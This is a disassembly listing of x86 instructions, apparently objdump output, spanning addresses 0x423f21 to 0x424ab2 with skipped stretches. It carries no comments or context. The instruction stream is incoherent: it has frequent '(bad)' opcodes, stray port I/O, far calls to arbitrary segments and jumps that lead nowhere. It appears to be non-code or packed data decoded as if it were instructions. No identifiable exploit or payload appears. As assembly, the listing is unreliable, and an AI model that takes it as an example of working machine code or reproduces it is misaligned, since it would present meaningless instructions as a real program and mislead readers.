  423f21:	or     BYTE PTR [ebp-0x7c3ffd7a],bh
  423f27:	xor    esp,DWORD PTR [esi+0x63]
  423f2a:	mov    ecx,0x766d93fc
  423f2f:	fwait
  423f30:	arpl   bx,bp
  423f32:	stc    
  423f33:	sbb    ebp,DWORD PTR [edx]
  423f35:	and    ebp,DWORD PTR [ecx-0x6334b9b5]
  423f3b:	jmp    0x1cfd5fdc
  423f40:	pop    ebp
  423f41:	pop    DWORD PTR [eax]
	...
  423fb3:	add    BYTE PTR [esi-0x1c],al
  423fb6:	bound  ecx,QWORD PTR [eax-0x1111711e]
  423fbc:	in     al,dx
  423fbd:	pop    ebx
  423fbe:	test   BYTE PTR [edx-0xc],dh
  423fc1:	mov    ebx,0x8042d0d8
  423fc6:	add    DWORD PTR [eax],eax
  423fc8:	test   BYTE PTR [eax],0x0
  423fcb:	add    BYTE PTR [edx+eiz*1],dh
  423fce:	mov    al,ds:0xf0ceadb0
  423fd3:	fmul   DWORD PTR [eax-0x74385ba7]
  423fd9:	es jg  0x423f72
  423fdc:	stos   DWORD PTR es:[edi],eax
  423fdd:	les    eax,FWORD PTR [esi]
  423fdf:	cmp    al,0x19
  423fe1:	push   eax
  423fe2:	cwde   
  423fe3:	sbb    eax,0x2dfb4755
  423fe8:	gs dec edi
  423fea:	push   ecx
  423feb:	sahf   
  423fec:	adc    al,0x8f
  423fee:	mov    ds:0x318092a3,eax
  423ff3:	pop    esp
  423ff4:	sbb    eax,0x3bcf7174
  423ff9:	fidiv  DWORD PTR [ecx-0x6a1dc81f]
  423fff:	push   ebx
  424000:	add    al,bl
  424002:	pop    ds
  424003:	xor    ecx,esi
  424005:	inc    cl
  424007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424008:	je     0x423fa8
  42400a:	xchg   esp,eax
  42400b:	test   dl,0x82
  42400e:	call   0xf57b:0xf71035a6
  424015:	sub    ecx,DWORD PTR [ecx-0x3349ab3f]
  42401b:	inc    ecx
  42401c:	je     0x424096
  42401e:	xor    edi,DWORD PTR [edx]
  424020:	jp     0x42407c
  424022:	in     eax,dx
  424023:	mov    ds:0x74a1758b,eax
  424028:	inc    esi
  424029:	int3   
  42402a:	repnz scas al,BYTE PTR es:[edi]
  42402c:	dec    esi
  42402d:	adc    ah,dh
  42402f:	out    0xa2,eax
  424031:	mov    ch,0x1c
  424033:	and    BYTE PTR [esi+0x54a3ff74],ah
  424039:	ins    BYTE PTR es:[edi],dx
  42403a:	test   BYTE PTR [edx+0x2d6b528],bh
  424040:	(bad)
  424043:	(bad)
  424047:	leave  
  424048:	test   DWORD PTR [edi+0x2247c768],ebp
  42404e:	ja     0x424051
  424050:	fist   WORD PTR [edx]
  424052:	leave  
  424053:	iret   
  424054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424055:	retf   
  424056:	xor    BYTE PTR [edx+0x4],bl
  424059:	out    dx,al
  42405a:	or     eax,0xda6b6a95
  42405f:	in     al,0x93
  424061:	pushf  
  424062:	loop   0x424023
  424064:	or     BYTE PTR [eax+0x71f06820],0xe3
  42406b:	sub    esp,eax
  42406d:	inc    ebx
  42406e:	pop    ebx
  42406f:	es inc edx
  424071:	dec    edx
  424072:	dec    esp
  424073:	test   BYTE PTR [ecx+0x382e35b1],bh
  424079:	jge    0x4240f0
  42407b:	sub    DWORD PTR [edi],ecx
  42407d:	xor    DWORD PTR [eax-0x4d],0x5b
  424081:	mov    cl,0xb
  424083:	cdq    
  424084:	xor    DWORD PTR [ecx+0x2b52a6ff],0xffffffcc
  42408b:	xchg   edx,eax
  42408c:	sub    bl,BYTE PTR [ebp+0x2b402234]
  424092:	cmp    esi,DWORD PTR [edx+edx*4+0x55]
  424096:	sub    BYTE PTR [ebx+0x691936c1],bh
  42409c:	stos   BYTE PTR es:[edi],al
  42409d:	(bad)  
  42409e:	mov    ecx,0x93deab30
  4240a3:	jmp    0x4bb6:0x379cc0b
  4240aa:	jne    0x4240e4
  4240ac:	push   0xbcf6c8cc
  4240b1:	lds    ebp,FWORD PTR [ebp+0x38658c59]
  4240b7:	sub    ecx,DWORD PTR [esi+ebx*2+0x3a]
  4240bb:	cmp    ah,dl
  4240bd:	adc    BYTE PTR [ebx],dl
  4240bf:	pushf  
  4240c0:	mov    edi,0xef
	...
  424131:	add    BYTE PTR [eax],al
  424133:	add    BYTE PTR [ecx-0xf],bh
  424136:	div    DWORD PTR [ecx-0x6804801]
  42413c:	bound  esi,QWORD PTR [eax-0x35498496]
  424142:	mov    dl,BYTE PTR [ebx+0x38]
  424145:	add    DWORD PTR [ecx],0xf600
  42414b:	add    BYTE PTR [eax-0xc86add1],dl
  424151:	ds gs lock out dx,al
  424155:	call   0x3e806f4f
  42415a:	mov    esp,gs
  42415c:	sub    eax,DWORD PTR [edx-0x8]
  42415f:	repnz out dx,al
  424161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424162:	xor    bl,BYTE PTR [edx+0x5e]
  424165:	fstp   QWORD PTR [edi]
  424167:	xchg   esp,eax
  424168:	loope  0x4241e4
  42416a:	adc    dh,BYTE PTR gs:[edx]
  42416d:	inc    ecx
  42416e:	add    BYTE PTR [ecx+0x23a334f2],bh
  424174:	xchg   esp,esi
  424176:	js     0x424124
  424178:	sbb    ecx,esi
  42417a:	stc    
  42417b:	mov    ecx,DWORD PTR [esi]
  42417d:	mov    ah,0xe
  42417f:	aad    0x80
  424181:	rcl    DWORD PTR [esi+0x71],1
  424184:	cli    
  424185:	(bad)  [eax]
  424187:	fidiv  WORD PTR [eax-0x70]
  42418a:	mov    BYTE PTR [esi],bl
  42418c:	sti    
  42418d:	cmp    DWORD PTR [esi],0x66
  424190:	shr    DWORD PTR [eax-0x404f8148],1
  424196:	mov    WORD PTR [edi+edx*2-0x75],cs
  42419a:	mov    BYTE PTR [edx],ch
  42419c:	jle    0x424185
  42419e:	cmc    
  42419f:	sahf   
  4241a0:	xor    DWORD PTR [ebx+0x671579c2],0x12434ee0
  4241aa:	inc    edx
  4241ab:	call   0xd2a8e929
  4241b0:	imul   edx,eax,0x7c10b295
  4241b6:	jecxz  0x42422f
  4241b8:	pushf  
  4241b9:	out    0x8e,eax
  4241bb:	imul   ebx,DWORD PTR [edi],0xaf02ea7
  4241c1:	mov    ah,0xdb
  4241c3:	add    eax,0x10ebd9b8
  4241c8:	mov    ah,0x27
  4241ca:	jp     0x424178
  4241cc:	dec    esp
  4241cd:	pop    edi
  4241ce:	stos   BYTE PTR es:[edi],al
  4241cf:	mov    bh,0x6d
  4241d1:	cli    
  4241d2:	leave  
  4241d3:	mov    bh,0x4e
  4241d5:	ficomp WORD PTR [edx]
  4241d7:	push   esi
  4241d8:	or     DWORD PTR [ebp-0x79],ecx
  4241db:	and    esp,DWORD PTR [edx+0x13]
  4241de:	pop    esi
  4241df:	jnp    0x42423f
  4241e1:	popa   
  4241e2:	jp     0x424236
  4241e4:	aam    0xd2
  4241e6:	mov    ah,0x30
  4241e8:	mul    DWORD PTR [ecx]
  4241ea:	sbb    DWORD PTR [esi],0xe05ae955
  4241f0:	test   bh,0x21
  4241f3:	mov    edx,0x65b0a8f7
  4241f8:	sub    ebx,DWORD PTR [ecx-0x2b8de2a3]
  4241fe:	sbb    esi,DWORD PTR [edx+0x2f84c40f]
  424204:	enter  0xf4c,0x74
  424208:	inc    edx
  424209:	in     al,0x12
  42420b:	adc    DWORD PTR [edx],eax
  42420d:	(bad)  
  42420e:	loopne 0x424210
  424210:	pop    ebx
  424211:	fcmovbe st,st(1)
  424213:	lods   eax,DWORD PTR ds:[esi]
  424214:	pop    esp
  424215:	sub    al,0x31
  424217:	(bad)  
  424218:	sbb    BYTE PTR [ebx-0x38eeed60],bh
  42421e:	or     al,0xb4
  424220:	push   ebp
  424221:	imul   edi,edi,0x6e419f75
  424227:	push   ss
  424228:	mov    bh,0x3a
  42422a:	mov    eax,ds:0x951e53b5
  42422f:	push   ebx
  424230:	jmp    0x9738:0x64fb8a23
  424237:	mov    ah,0x41
  424239:	cmp    dh,ah
  42423b:	aas    
  42423c:	out    0x93,eax
  42423e:	neg    DWORD PTR [ecx+0x67]
  424241:	rol    DWORD PTR [eax],cl
	...
  4242b3:	add    al,bh
  4242b5:	fisub  WORD PTR [edx+0x30]
  4242b8:	mov    sp,0xdefa
  4242bc:	push   ss
  4242bd:	mov    ds:0x5328a4bf,eax
  4242c2:	(bad)  
  4242c3:	loope  0x4242f3
  4242c5:	add    BYTE PTR [ecx],0x0
  4242c8:	test   BYTE PTR [eax],0x0
  4242cb:	add    BYTE PTR ds:0xb39f9bb4,dl
  4242d1:	popf   
  4242d2:	stos   BYTE PTR es:[edi],al
  4242d3:	mov    ?,WORD PTR [eax-0x48]
  4242d6:	ret    
  4242d7:	cmc    
  4242d8:	push   ebp
  4242d9:	xchg   DWORD PTR [ecx+0x422c2259],ebp
  4242df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242e0:	loopne 0x4242fb
  4242e2:	out    0xf0,eax
  4242e4:	pop    esp
  4242e5:	loope  0x424288
  4242e7:	xor    BYTE PTR [eax-0x3603d1a1],dl
  4242ed:	sub    BYTE PTR [ebx],bh
  4242ef:	fisttp DWORD PTR [edx+0x385bd4e9]
  4242f5:	rcr    DWORD PTR [eax],0x7
  4242f8:	sbb    DWORD PTR [edx+0x3c2820ba],0x6c
  4242ff:	sbb    bl,cl
  424301:	xor    al,0xe6
  424303:	inc    esi
  424304:	sti    
  424305:	adc    BYTE PTR [esi-0xb3ae97],0x15
  42430c:	sub    DWORD PTR [edx],esp
  42430e:	test   al,0x79
  424310:	dec    eax
  424311:	fadd   st(1),st
  424313:	xchg   esp,eax
  424314:	scas   eax,DWORD PTR es:[edi]
  424315:	lahf   
  424316:	sub    esi,DWORD PTR [esi+0x78]
  424319:	inc    eax
  42431a:	sbb    esp,DWORD PTR gs:[edi]
  42431d:	or     eax,0x961e02f3
  424322:	mov    bl,0x5f
  424324:	enter  0x4f58,0xde
  424328:	ds jle 0x4242cb
  42432b:	das    
  42432c:	outs   dx,BYTE PTR ds:[esi]
  42432d:	shl    edi,0x9a
  424330:	mov    ds:0xd7e0a9a0,al
  424335:	imul   eax,DWORD PTR [ecx+0x77],0x23ee19b2
  42433c:	mov    al,0x79
  42433e:	add    dl,BYTE PTR [eax+0x19]
  424341:	test   eax,0xe43adb5f
  424346:	mov    ?,edx
  424348:	push   ecx
  424349:	or     esi,ebp
  42434b:	mov    edi,0xbe4edc94
  424350:	adc    DWORD PTR [edi-0x77d895ba],0x48752cdf
  42435a:	pop    ebp
  42435b:	fistp  WORD PTR [ebp-0x35]
  42435e:	pop    esp
  42435f:	xchg   edi,eax
  424360:	or     BYTE PTR [edx+0x2fba663d],ch
  424366:	push   es
  424367:	cmpxchg BYTE PTR [esp+ebx*8-0x54],bl
  42436c:	pop    ebp
  42436d:	xchg   ebx,eax
  42436e:	pop    ebp
  42436f:	inc    edx
  424370:	dec    edx
  424371:	or     BYTE PTR [edx+ecx*1],dh
  424374:	nop
  424375:	and    eax,0x34e58472
  42437a:	xor    eax,0xb246250
  42437f:	pop    es
  424380:	sbb    BYTE PTR [edi+0x39],cl
  424383:	pop    edx
  424384:	retf   
  424385:	inc    esp
  424386:	dec    esp
  424387:	push   0xab68c9f0
  42438c:	mov    es,WORD PTR [ecx-0x1d8da770]
  424392:	cmp    DWORD PTR [edi-0x7698bb70],ecx
  424398:	mov    edx,0x7c6f6213
  42439d:	fstp   QWORD PTR [edi]
  42439f:	fld    QWORD PTR [edi]
  4243a1:	and    ebx,DWORD PTR [ecx+edx*1-0x95e83b3]
  4243a8:	jmp    0x424351
  4243aa:	adc    BYTE PTR [edx],0x3b
  4243ad:	inc    ecx
  4243ae:	xlat   BYTE PTR ds:[ebx]
  4243af:	pop    ecx
  4243b0:	cmp    BYTE PTR [eax+0x5],dl
  4243b3:	int3   
  4243b4:	out    0x8e,al
  4243b6:	xor    eax,0xef0ae3d1
  4243bb:	int3   
  4243bc:	stc    
  4243bd:	cmp    BYTE PTR [ebx],0x45
  4243c0:	jo     0x424435
	...
  424432:	add    BYTE PTR [eax],al
  424434:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42443b:	mov    edi,0xd28abb70
  424440:	mov    edx,0x24a0d53a
  424445:	add    DWORD PTR [ecx],0x0
  424448:	test   BYTE PTR [eax],0x0
  42444b:	add    dl,ch
  42444d:	mov    ds:0x49003bf0,al
  424452:	in     al,dx
  424453:	mov    al,0x34
  424455:	sub    BYTE PTR [eax],ch
  424457:	dec    ebx
  424458:	or     dl,BYTE PTR [ebx+0x2a204b05]
  42445e:	call   0x48b897e8
  424463:	fnsave [ebx-0x1519afa9]
  424469:	dec    eax
  42446a:	lahf   
  42446b:	xor    esp,DWORD PTR [ebp-0x3f35cc3b]
  424471:	cs dec esi
  424473:	or     esp,DWORD PTR [ebx]
  424475:	jge    0x4244f2
  424477:	cmp    dl,BYTE PTR [edi-0x1d]
  42447a:	fldcw  WORD PTR [ebx+0x60]
  42447d:	sbb    DWORD PTR [esi+esi*4],esp
  424480:	mov    eax,0x28534e79
  424485:	int3   
  424486:	je     0x4244ad
  424488:	add    eax,0x6ccd072a
  42448d:	stos   BYTE PTR es:[edi],al
  42448e:	push   esi
  42448f:	sbb    esi,DWORD PTR [esi]
  424491:	cmp    eax,esi
  424493:	cmp    BYTE PTR [esi+eax*2-0x3ab79833],bl
  42449a:	mov    ecx,0x8071276b
  42449f:	sbb    dl,al
  4244a1:	ret    0xa76e
  4244a4:	jecxz  0x424518
  4244a6:	sub    ch,bh
  4244a8:	outs   dx,DWORD PTR ds:[esi]
  4244a9:	mov    eax,ds:0x8e5a5542
  4244ae:	iret   
  4244af:	repz cdq 
  4244b1:	sti    
  4244b2:	xor    al,0x89
  4244b4:	xchg   edi,eax
  4244b5:	test   BYTE PTR [ebp+0x7579d416],ah
  4244bb:	fsubr  DWORD PTR [edx-0x24b04bd7]
  4244c1:	pusha  
  4244c2:	mov    dh,0x2d
  4244c4:	test   DWORD PTR [esi],esi
  4244c6:	adc    ecx,edi
  4244c8:	or     DWORD PTR [ebp-0x31c1e274],edi
  4244ce:	pop    eax
  4244cf:	dec    edi
  4244d0:	mov    ?,ebp
  4244d2:	aas    
  4244d3:	add    DWORD PTR [esi-0x7e],esi
  4244d6:	jecxz  0x4244ae
  4244d8:	bound  eax,QWORD PTR [ebp-0x4d]
  4244db:	retf   
  4244dc:	dec    ebp
  4244dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244de:	sbb    WORD PTR [edx+esi*1-0x19],bp
  4244e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244e4:	jge    0x424528
  4244e6:	fcom   DWORD PTR [ecx-0x1b2c366d]
  4244ec:	and    edx,esp
  4244ee:	loop   0x424494
  4244f0:	mov    es,ebp
  4244f2:	outs   dx,DWORD PTR ds:[esi]
  4244f3:	or     esi,0xb418909a
  4244f9:	xchg   ebx,eax
  4244fa:	mov    ah,0x22
  4244fc:	std    
  4244fd:	cmp    esp,edi
  4244ff:	fcom   DWORD PTR [edx]
  424501:	or     eax,0xa407885a
  424506:	mov    ds:0x5547f807,eax
  42450b:	int    0x85
  42450d:	out    0xec,eax
  42450f:	xchg   edi,eax
  424510:	push   ecx
  424511:	loopne 0x4244a2
  424513:	(bad)  [esi+0x7d]
  424516:	and    al,cl
  424518:	iret   
  424519:	call   0x44810c2b
  42451e:	push   edx
  42451f:	aam    0xee
  424521:	push   ebp
  424522:	out    dx,al
  424523:	lock and DWORD PTR [ebx-0x4e],ebx
  424527:	jne    0x42457b
  424529:	std    
  42452a:	mov    bl,0x84
  42452c:	pop    ebx
  42452d:	cmp    DWORD PTR [edi-0x38bb518a],0xc9afd80b
  424537:	fs jle 0x424555
  42453a:	scas   eax,DWORD PTR es:[edi]
  42453b:	and    eax,0x1b6b1492
  424540:	loopne 0x424553
	...
  4245b2:	add    BYTE PTR [eax],al
  4245b4:	or     BYTE PTR [edi-0x8808b84],0x88
  4245bb:	(bad)  
  4245bc:	jle    0x424610
  4245be:	ins    BYTE PTR es:[edi],dx
  4245bf:	xor    ecx,esi
  4245c1:	push   ebp
  4245c2:	ds loop 0x4245df
  4245c5:	test   BYTE PTR [ecx],al
  4245c7:	add    dh,dh
  4245c9:	add    BYTE PTR [eax],al
  4245cb:	add    BYTE PTR [eax-0x5a756a],bh
  4245d1:	popf   
  4245d2:	cli    
  4245d3:	daa    
  4245d4:	es std 
  4245d6:	push   edx
  4245d7:	fmul   QWORD PTR [ecx]
  4245d9:	jo     0x424584
  4245db:	jmp    0x3bfc5c64
  4245e0:	(bad)  
  4245e1:	jbe    0x424587
  4245e3:	or     edx,DWORD PTR ds:0x62fa54a4
  4245e9:	call   0x702:0x519a4964
  4245f0:	popa   
  4245f1:	ss jmp 0xfab45eb6
  4245f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245f8:	nop
  4245f9:	dec    eax
  4245fa:	mov    dl,0xbd
  4245fc:	retf   0xd337
  4245ff:	xor    ebx,DWORD PTR gs:[edx]
  424602:	xor    esp,DWORD PTR [edx]
  424604:	ins    BYTE PTR es:[edi],dx
  424605:	sbb    cl,cl
  424607:	xchg   edx,eax
  424608:	call   0x2bd94e5c
  42460d:	outs   dx,DWORD PTR ds:[esi]
  42460e:	pop    ebp
  42460f:	imul   edi,eax,0xcd14b5be
  424615:	mov    ebx,0x874ab34f
  42461a:	push   0x3953c35e
  42461f:	or     bl,ch
  424621:	ret    0xd92b
  424624:	out    dx,eax
  424625:	hlt    
  424626:	cmp    al,0x8
  424628:	fwait
  424629:	jb     0x424648
  42462b:	mov    bl,0xbc
  42462d:	jb     0x4245cf
  42462f:	jle    0x4245b5
  424631:	jno    0x4245f9
  424633:	call   FWORD PTR [ecx]
  424635:	loope  0x424675
  424637:	mov    al,dh
  424639:	and    DWORD PTR [ebx],0xffffffd9
  42463c:	mov    ds:0x6d24c94b,al
  424641:	cmp    BYTE PTR [ecx],dl
  424643:	es push ebp
  424645:	es retf 
  424647:	shl    edx,0x67
  42464a:	(bad)  
  42464c:	add    DWORD PTR [edx],0xc39079e5
  424652:	xor    DWORD PTR fs:[ebp-0x6cc47e29],eax
  424659:	sti    
  42465a:	addr16 mov eax,0xc488d99d
  424660:	test   edi,esp
  424662:	xor    BYTE PTR [edi],ch
  424664:	or     eax,ebx
  424666:	sti    
  424667:	stc    
  424668:	inc    eax
  424669:	mov    ah,0x90
  42466b:	fstp   DWORD PTR [ebx+0x14e0e147]
  424671:	xlat   BYTE PTR ds:[ebx]
  424672:	cmp    al,al
  424674:	cmp    edx,ebp
  424676:	jns    0x424641
  424678:	push   ebx
  424679:	pushf  
  42467a:	mov    gs,ecx
  42467c:	ret    
  42467d:	dec    esp
  42467e:	sub    al,0xc5
  424680:	fistp  DWORD PTR [edx+0x1091fe5a]
  424686:	fs mov edi,0x5f82b52d
  42468c:	out    0x1f,al
  42468e:	jnp    0x4246d9
  424690:	push   esi
  424691:	loope  0x42464d
  424693:	test   DWORD PTR fs:[esi],eax
  424696:	adc    eax,esi
  424698:	nop
  424699:	jmp    DWORD PTR [ecx+0x2f]
  42469c:	sbb    BYTE PTR [ecx+edx*1],ah
  42469f:	jle    0x424642
  4246a1:	mov    esp,DWORD PTR [ecx+0x54]
  4246a4:	cmp    BYTE PTR [eax-0x6bb7ffe0],0x2d
  4246ab:	(bad)  
  4246ac:	cmc    
  4246ad:	inc    eax
  4246ae:	push   edx
  4246af:	mov    ?,WORD PTR [eax]
  4246b1:	add    eax,0x56dab74e
  4246b6:	and    edi,DWORD PTR [ebp-0x5de4fd76]
  4246bc:	or     al,BYTE PTR [esi+edx*1+0x46]
  4246c0:	arpl   bx,bx
	...
  424732:	add    BYTE PTR [eax],al
  424734:	xor    al,0x23
  424736:	jo     0x4246d5
  424738:	ja     0x424719
  42473a:	std    
  42473b:	stos   DWORD PTR es:[edi],eax
  42473c:	lods   eax,DWORD PTR ds:[esi]
  42473d:	and    ebp,esi
  42473f:	fstp   QWORD PTR [ecx-0xf]
  424742:	pop    ds
  424743:	cld    
  424744:	adc    BYTE PTR [ebp+0xf60001],al
  42474a:	add    BYTE PTR [eax],al
  42474c:	ss jbe 0x4247ba
  42474f:	aad    0x8c
  424751:	sbb    esi,0x7bc86634
  424757:	sbb    al,0x11
  424759:	inc    ecx
  42475a:	sub    ebx,esi
  42475c:	jbe    0x42474f
  42475e:	mov    ds:0x61a4f66a,al
  424763:	lea    edi,[ebp-0x4d2d5544]
  424769:	retf   0xdf43
  42476c:	inc    ebp
  42476d:	mov    esp,0x4c5a63b6
  424772:	shl    BYTE PTR [edx-0x75],1
  424775:	dec    ebp
  424776:	sub    eax,0x8ce6923c
  42477b:	adc    al,0x55
  42477d:	push   ds
  42477e:	jmp    0x55e04e03
  424783:	out    0xb1,al
  424785:	adc    al,0xb3
  424787:	xchg   esp,eax
  424788:	push   ebx
  424789:	dec    esp
  42478a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42478c:	jns    0x4247d3
  42478e:	and    bl,dh
  424790:	fdivr  QWORD PTR [edi+0x7ece5ef2]
  424796:	das    
  424797:	and    esp,edi
  424799:	xlat   BYTE PTR ds:[ebx]
  42479a:	sbb    BYTE PTR [ecx],bl
  42479c:	jecxz  0x4247e5
  42479e:	jmp    0x424814
  4247a0:	jno    0x42474c
  4247a2:	pop    esp
  4247a3:	stc    
  4247a4:	test   al,0x82
  4247a6:	icebp  
  4247a7:	push   ecx
  4247a8:	fcmovne st,st(2)
  4247aa:	mov    esp,0x9e05776a
  4247af:	into   
  4247b0:	pop    eax
  4247b1:	call   0x5e8d:0x312da1d4
  4247b8:	(bad)  
  4247ba:	or     edi,0x1a
  4247bd:	(bad)  
  4247be:	shrd   DWORD PTR ds:0xdd15f481,esp,cl
  4247c5:	bsf    edx,DWORD PTR [edx]
  4247c8:	std    
  4247c9:	fisttp DWORD PTR [edx-0x126364c5]
  4247cf:	shl    DWORD PTR [eax+0x6b],1
  4247d2:	cmp    DWORD PTR [edi],0x48329bbd
  4247d8:	(bad)  
  4247d9:	jl     0x4247be
  4247db:	rcl    DWORD PTR [esi],0x43
  4247de:	aas    
  4247df:	test   eax,0xc6471657
  4247e4:	push   cs
  4247e5:	mov    ds:0x274a8090,al
  4247ea:	mov    ah,0x35
  4247ec:	or     BYTE PTR [ebx],0x7e
  4247ef:	je     0x424825
  4247f1:	data16 cli 
  4247f3:	inc    ebp
  4247f4:	out    dx,eax
  4247f5:	ds push esp
  4247f7:	fsub   QWORD PTR [esi]
  4247f9:	dec    ebx
  4247fa:	dec    ecx
  4247fb:	sti    
  4247fc:	stos   BYTE PTR es:[edi],al
  4247fd:	xchg   esp,eax
  4247fe:	repz out 0x34,eax
  424801:	aam    0x9
  424803:	cmp    DWORD PTR [edi],ecx
  424805:	inc    ecx
  424806:	add    al,0xa3
  424808:	sbb    bl,dl
  42480a:	and    al,0xf7
  42480c:	inc    ebp
  42480d:	fidiv  WORD PTR [esi]
  42480f:	cs push cs
  424811:	cmp    BYTE PTR [eax+0x5416db31],ah
  424817:	in     al,0xa1
  424819:	aad    0xb4
  42481b:	mov    al,0x9d
  42481d:	mov    ah,0x5c
  42481f:	push   ds
  424820:	and    eax,0x6187a8fb
  424825:	add    DWORD PTR [eax],esi
  424827:	pushf  
  424828:	and    DWORD PTR [ecx-0x6e8bec60],edx
  42482e:	dec    edx
  42482f:	sbb    eax,0x76784294
  424834:	xchg   ebp,eax
  424835:	add    dl,dh
  424837:	push   ebx
  424838:	test   al,0x2a
  42483a:	addr16 (bad) 
  42483c:	(bad)  
  42483d:	pop    esi
  42483e:	pop    esp
  42483f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424840:	aam    0x85
	...
  4248b2:	add    BYTE PTR [eax],al
  4248b4:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  4248bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248bc:	arpl   WORD PTR [ecx+0x31],dx
  4248bf:	je     0x4248e2
  4248c1:	icebp  
  4248c2:	sbb    DWORD PTR [esi+eax*1-0x9fffe7a],ecx
  4248c9:	add    BYTE PTR [eax],al
  4248cb:	add    dh,dl
  4248cd:	jmp    0xcb64a4dc
  4248d2:	out    0x59,eax
  4248d4:	stos   DWORD PTR es:[edi],eax
  4248d5:	mov    ds:0x21807909,eax
  4248da:	mov    edx,0xe7a28211
  4248df:	push   0x32
  4248e1:	in     al,0xe3
  4248e3:	xchg   esi,eax
  4248e4:	retf   
  4248e5:	and    eax,0x83700328
  4248ea:	jns    0x424925
  4248ec:	mov    edi,0x65cd7d6d
  4248f1:	sbb    ebp,ebp
  4248f3:	aas    
  4248f4:	jb     0x424928
  4248f6:	je     0x4248e8
  4248f8:	ins    BYTE PTR es:[edi],dx
  4248f9:	cli    
  4248fa:	and    ch,BYTE PTR [ebp+0x55172a82]
  424900:	(bad)  
  424901:	jb     0x4248ae
  424903:	sub    ah,dl
  424905:	add    eax,0x6ecbe9b2
  42490a:	fild   DWORD PTR [ecx+esi*1+0x37]
  42490e:	adc    BYTE PTR [ebx],0x2d
  424911:	retf   
  424912:	push   0x99eb1183
  424917:	sbb    ebp,edx
  424919:	(bad)  
  42491a:	jp     0x42490f
  42491c:	ja     0x4248de
  42491e:	imul   esp,DWORD PTR [ebx],0xffffffc5
  424921:	push   ebx
  424922:	xor    dl,BYTE PTR [esi+0x2d]
  424925:	loopne 0x42494e
  424927:	mov    BYTE PTR ds:[edx-0x55],0xc5
  42492c:	rol    DWORD PTR [esp+eax*1-0x74],0xa0
  424931:	jl     0x4248e1
  424933:	or     eax,0x3d3da39
  424938:	add    BYTE PTR [esi-0x1c892008],dh
  42493e:	sbb    DWORD PTR [esi],esi
  424940:	mov    dl,BYTE PTR [eax-0x284fdbc6]
  424946:	xor    DWORD PTR [edi+0x8],edx
  424949:	push   ebx
  42494a:	lock scas eax,DWORD PTR es:[edi]
  42494c:	rcr    bh,0x49
  42494f:	(bad)  
  424950:	adc    BYTE PTR [edi+0x6257b95b],bl
  424956:	lods   al,BYTE PTR cs:[esi]
  424958:	mov    esp,0xd4c3ea7b
  42495d:	cmp    dh,BYTE PTR [edx-0x268bff2e]
  424963:	out    dx,eax
  424964:	jecxz  0x424976
  424966:	in     al,dx
  424967:	inc    edx
  424968:	mov    es,WORD PTR [edi]
  42496a:	pushf  
  42496b:	dec    ecx
  42496c:	pop    ebx
  42496d:	pop    ss
  42496e:	sbb    BYTE PTR [edi],al
  424970:	mov    DWORD PTR [edi],ebx
  424972:	outs   dx,DWORD PTR cs:[esi]
  424974:	out    0xe1,eax
  424976:	sbb    al,0x4f
  424978:	mov    bh,0x25
  42497a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42497b:	fld    DWORD PTR ds:0x97a14087
  424981:	in     eax,dx
  424982:	adc    edx,esp
  424984:	mov    eax,0xbb8f1d84
  424989:	call   0x88b6:0x70eb46c7
  424990:	retf   
  424991:	mov    WORD PTR [ebp-0x64543272],?
  424997:	imul   esi,DWORD PTR [esi-0x14f64648],0xfffffffd
  42499e:	mov    eax,ds:0x8de04fd5
  4249a3:	and    esp,esi
  4249a5:	sbb    esp,DWORD PTR [ebx-0x1f88165e]
  4249ab:	adc    BYTE PTR [ebx],ah
  4249ad:	jo     0x42496d
  4249af:	xor    eax,0x34fe6656
  4249b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249b5:	pop    ecx
  4249b6:	femms  
  4249b8:	loop   0x424a15
  4249ba:	dec    edx
  4249bb:	push   ebp
  4249bc:	mov    dh,0x4d
  4249be:	(bad)  
  4249bf:	mov    ds:0x406d,eax
	...
  424a34:	xor    BYTE PTR ds:0xdf7d9f75,bh
  424a3a:	cli    
  424a3b:	mov    edi,0x13301881
  424a40:	sub    bl,BYTE PTR [eax-0x7903a2c3]
  424a46:	add    DWORD PTR [eax],eax
  424a48:	test   BYTE PTR [eax],0x0
  424a4b:	add    dl,bh
  424a4d:	fwait
  424a4e:	sbb    ebp,DWORD PTR [ebp-0x4cc58456]
  424a54:	stc    
  424a55:	lahf   
  424a56:	das    
  424a57:	inc    ebp
  424a58:	imul   ecx,ebx,0xd450579b
  424a5e:	fmul   DWORD PTR [ebx]
  424a60:	mov    esp,0x9fb71b3
  424a65:	loop   0x424a23
  424a67:	bswap  ecx
  424a69:	jle    0x424ac3
  424a6b:	sub    dl,BYTE PTR [eax]
  424a6d:	mov    ah,0xf8
  424a6f:	jg     0x424a27
  424a71:	or     esi,esp
  424a73:	and    edi,DWORD PTR [esi+0xf]
  424a76:	adc    cl,BYTE PTR [eax]
  424a78:	fld    QWORD PTR [esi-0xcd7ad82]
  424a7e:	and    eax,0x22493557
  424a83:	cdq    
  424a84:	scas   al,BYTE PTR es:[edi]
  424a85:	lahf   
  424a86:	scas   eax,DWORD PTR es:[edi]
  424a87:	out    dx,eax
  424a88:	lock add bl,dl
  424a8b:	and    BYTE PTR [edi],dh
  424a8d:	xchg   edi,eax
  424a8e:	js     0x424aca
  424a90:	inc    ebp
  424a91:	outs   dx,DWORD PTR ds:[esi]
  424a92:	push   0x2c
  424a94:	(bad)  
  424a95:	lods   al,BYTE PTR ds:[esi]
  424a96:	xchg   BYTE PTR [edx+0x60],bl
  424a99:	mov    esi,0xdb841bf4
  424a9e:	aam    0x6c
  424aa0:	mov    dh,0x56
  424aa2:	mov    ebx,0x670e2411
  424aa7:	call   0xf94c:0x19efc0c9
  424aae:	ds out 0x9b,eax
  424ab1:	pusha  
  424ab2:	xor    DWORD PTR [edi-0x2ab1a8b8],0xd0c098a0
